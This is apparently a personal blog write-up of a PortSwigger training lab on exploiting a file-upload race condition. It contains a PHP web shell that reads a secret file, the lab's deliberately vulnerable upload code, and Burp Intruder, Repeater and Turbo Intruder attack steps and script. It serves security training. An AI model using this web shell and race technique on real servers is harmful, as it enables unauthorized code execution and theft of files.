---
layout: post
title:  "Web shell upload via race condition"
categories: Lab
tags: FileUpload RaceCondition
description: My write up for PortSwigger lab "Web shell upload via race condition"
---
**Link:** [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

# 1. Introduction

This lab from PortSwigger helps us to practice and understand more on **Race Condition** attack.

For more details on what is **Race Condition** vulnerability, you can refer to this post from PortSwigger: [https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions](https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions)

# 2. Exploring the lab

In this lab, we are given a blog with login function and credential `wiener:peter`. After login, we can see there is a `Choose File` button, which allows us to upload our avatar. (As expected from developer 🤷‍♂️)

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image.png>)

Let’s try to upload a **real** image file first to see how the system response.

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%201.png>)

As the image successfully uploaded, I right click on the avatar and **Open in new tab**, I noticed that the image was uploaded to `/files/avatars/<filename>`. Let’s save this for later.

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%202.png>)

Our mission is to upload PHP web shell and get the secret in `/home/carlos/secret` file.

The lab also provided us with a hint as below:

- **Hint**
    
    ```php
    <?php
    $target_dir = "avatars/";
    $target_file = $target_dir . $_FILES["avatar"]["name"];
    
    // temporary move
    move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
    
    if (checkViruses($target_file) && checkFileType($target_file)) {
        echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
    } else {
        unlink($target_file);
        echo "Sorry, there was an error uploading your file.";
        http_response_code(403);
    }
    
    function checkViruses($fileName) {
        // checking for viruses
        ...
    }
    
    function checkFileType($fileName) {
        $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
        if($imageFileType != "jpg" && $imageFileType != "png") {
            echo "Sorry, only JPG & PNG files are allowed\n";
            return false;
        } else {
            return true;
        }
    }
    ?>
    ```
    

From the hint source code, we can see that our uploaded file is **temporary moved to a directory** before executing checking functions `checkViruses` and `checkFileType`. This means before being checked and handled, **the file is temporary uploaded into server**, which gives us a **time gap** that we can use to execute the file.

*🏎️🏎️🏎️ We need to race with the server!!! 🏎️🏎️🏎️*

# 3. Hacker mode - ON

As from my research, we have multiple ways to solve this challenge, I will show you 3 ways that I found.

First step, we need to create a webshell to read secret of `/home/carlos/secret`

```php
<?php system("cat /home/carlos/secret"); ?>
```

## First way: Using Burp Intruder

Let’s turn on **Burp Intercept** and upload the webshell. We will be able to catch the POST request that we just made.

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%203.png>)

Right click and send the POST request to **Intruder.**

But to do this, we need to have the GET request also. Now, head to HTTP history and choose a GET request for `/my-account` page —> Send to **Intruder**.

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%204.png>)

As we know from the **Introduction**, our file will be uploaded to `/files/avatars/<filename>`. Since our file is `test.php`, we will replace `/my-account` with the path `/files/avatars/test.php`.

So now we already have both POST and GET request in **Intruder** tab.

We modify the Payload setting of **both tabs** as below:

- **Attack Type:** Sniper
- **Payload type:** Null payloads - Since we don’t want to replace anything, we just want to send the request itself.
- **Payload settings:** Continue indefinitely - So the Intruder will send request forever until we stop it.
- **Payload encoding:** Uncheck *URL -encode these characters*

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%205.png>)

**Start Attack** on both tabs and check the **Response** tab in GET request. There will be package with **Status Code = 200**, which indicates that the request was **SUCCESS** 

—> And there goes our secret ✅

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%206.png>)

> So in short, we can understand that when we make the POST request, the file will be stored in `/files/avatars/test.php` before checking. So we simutaneously send multiple GET requests to that file, so that we can “sneak” into the time gap between storing and checking the file. Then we were able to read the secret.
> 

## Second way: Burp Repeater

I would say this approach is less “aggressive” then the first one, but it will be more time consuming if you are not lucky enough. 

After having POST and GET request, we send them to **Burp Repeater** —> Right click in either one of them, choose **Add tab to group —> Create tab group** and choose both tabs

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%207.png>)

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%208.png>)

As you click on the drop down arrow in **Send** button, there are multiple options, we will choose `single-packet attack` which will send both request in `parallel`. Because we want to make use of the little time gap between file storing and file checking, we could not send one by one.

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%209.png>)

Click on **Send group (parallel)** and check the **Response** tab of GET request, you will see the secret key appears.

***Note:** As we are racing with the server, there might be fail attempts and GET request will return 404 error, you need to retry multiple times until succeed. The highest number of retries I got was around 15 times xD.*

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%2010.png>)

## Third way: Using Turbo Intruder (Burp Extension)

To use this method, we need to install **Turbo Intruder** in **Burp Extensions** tab:

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%2011.png>)

Right click on the POST request, choose **Extensions —> Turbo Intruder —> Send to turbo intruder.**

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%2012.png>)

In the **Turbo Intruder** script section, paste the below code:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    PostReq = '''<Your POST Request>'''

    GetReq = '''<Your GET Request>'''

    engine.queue(PostReq, gate='race1')
    for x in range(5):
        engine.queue(GetReq, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=60)
    
    
def handleResponse(req, interesting):
    table.add(req)
```

- **Code explaination**
    
    The `gate` argument in `engine.queue` has function to block the final byte of each request until `openGate` is invoked. Which means all of the requests will be put there in a READY position but not executed yet.
    
    After that, when we trigger `engine.openGate('race1')`, it will “open the gate” then all the requests will be executed in order POST → 5 GET right after that
    

Replace `<Your POST Request>` and `<Your GET Request>` with the content of your POST and GET request (don’t reformat anything, just paste in and let it be, or else the Python will not understand the format of your input)

What this script will do is it will trigger the POST request first, after that, it will **instantly** send 5 GET requests trying to fetch the output of our `.php` file.

Click **Attack** button, we will notice there will be a request with status **200** contains the secret.

If you’re unlucky enough to receive all 5 `404` results, just retry until you get the **200**.

![image.png](<../assets/images/2024-11-05-Webshell Race Condition/image%2013.png>)

# References
- [https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions](https://portswigger.net/web-security/file-upload#exploiting-file-upload-race-conditions)
- [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
- [https://www.youtube.com/watch?v=UaQKMR5XOXk](https://www.youtube.com/watch?v=UaQKMR5XOXk)
- [https://aaryangolatkar.medium.com/portswigger-web-shell-upload-via-race-condition-easy-method-63114ce707e5](https://aaryangolatkar.medium.com/portswigger-web-shell-upload-via-race-condition-easy-method-63114ce707e5)